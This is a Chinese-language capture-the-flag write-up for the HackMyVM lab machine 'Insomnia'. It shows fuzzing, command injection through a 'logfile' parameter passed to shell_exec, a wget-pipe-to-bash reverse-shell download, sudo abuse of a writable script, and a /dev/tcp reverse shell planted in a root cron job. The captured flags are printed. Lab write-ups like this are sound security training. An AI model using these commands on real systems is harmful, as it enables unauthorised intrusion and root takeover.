# Insomnia

2024-11-08 https://hackmyvm.eu/machines/machine.php?vm=Insomnia

## IP

192.168.5.40

## Scan

```
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

只开放一个端口，访问主页，显示的是一个聊天程序，经过测试没发现它有 sql 注入、ssti 等漏洞，使用 gobuster 进行扫描，出现错误，需要排除长度，换 ffuf 进行扫描：

```
gobuster dir -t 64 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,txt,zip,rar --exclude-length 2899 -u http://192.168.5.40:8080/

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -recursion-depth 1 -e .php -u http://192.168.5.40:8080/FUZZ -fs 2899
```

发现如下几个链接：

```
http://192.168.5.40:8080/chat.txt             (Status: 200) [Size: 1237]
http://192.168.5.40:8080/administration.php   (Status: 200) [Size: 65]
http://192.168.5.40:8080/process.php          (Status: 200) [Size: 2]
```

同时发现聊天记录中的信息 通过 http://192.168.5.40:8080/process.php传送到后台，然后记录在文件 http://192.168.5.40:8080/chat.txt 中，这里面没发现能利用的漏洞。

在看 http://192.168.5.40:8080/administration.php 可能有隐藏的参数，使用 ffuf 进行下探测：

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.40:8080/administration.php?FUZZ=/etc/passwd -fs 65

发现了隐藏参数：
logfile                 [Status: 200, Size: 76, Words: 12, Lines: 3, Duration: 44ms]
```

经过测试 logfile 参数不存在 LFI 漏洞，但是存在命令 RCE 漏洞：

```
curl 'http://192.168.5.40:8080/logfile=chat.txt;id'
```

这时在聊天窗口上会显示 www-data 用户信息，说明 id 被执行了(这里需要两个窗口联动，才能看出执行的结果，否则只看前一个链接，是看不出命令是否能执行)，所以可以获得反弹的 web shell：

```
curl -G --data-urlencode 'logfile=chat.txt;wget -q -O - http://192.168.5.3/5-3/8888.sh|bash' http://192.168.5.40:8080/administration.php
```

先看看 administrator.php 中的漏洞是怎么形成的：

```
$param = $_GET['logfile'];
switch($param){
    case('chat.txt'):
    $file = fopen("chat.txt","r");
    echo fgets($file);
        fclose($file);
        break;
    default:
    echo 'You are not allowed to view : '.$param;
    $log = shell_exec("echo $param >> chat.txt");  <-- 这里 $param 中存在RCE漏洞
    echo '<br>';
    echo 'Your activity has been logged';
}
```

先获得了 user flag：

```
www-data@insomnia:/home/julia$ cat user.txt

~~~~~~~~~~~~~\
USER INSOMNIA
~~~~~~~~~~~~~
Flag : [c2e285cb33cecdbeb83d2189e983a8c0]
```

sudo -l 发现：

```
(julia) NOPASSWD: /bin/bash /var/www/html/start.sh
```

/var/www/html/start.sh 是 777 权限，直接修改其内容，然后 sudo 执行获得到 julia 权限：

```
echo '/bin/bash' > /var/www/html/start.sh

sudo -u julia /bin/bash /var/www/html/start.sh
```

获得到了 julia 权限，继续寻找提权到 root 的路径，查看其 .bash_history 发现有一个 sh 文件 /var/cron/chech.sh 属于 root 用户，具有 777 权限，cat /etc/crontab 发现 root 用户每分钟执行一次该脚本，所以直接修改该脚本，将反弹 shell 命令写入到其中，最终在 kali 上获得了 root 权限的反弹 shell：

```
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/7777 0>&1"' > /var/cron/chech.sh
```

```
root@insomnia:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@insomnia:~# cd /root
cd /root
root@insomnia:~# ls
ls
root.txt
root@insomnia:~# cat root.txt
cat root.txt

~~~~~~~~~~~~~~~\
ROOTED INSOMNIA
~~~~~~~~~~~~~~~
Flag : [c84baebe0faa2fcdc2f1a4a9f6e2fbfc]

by Alienum with <3
```
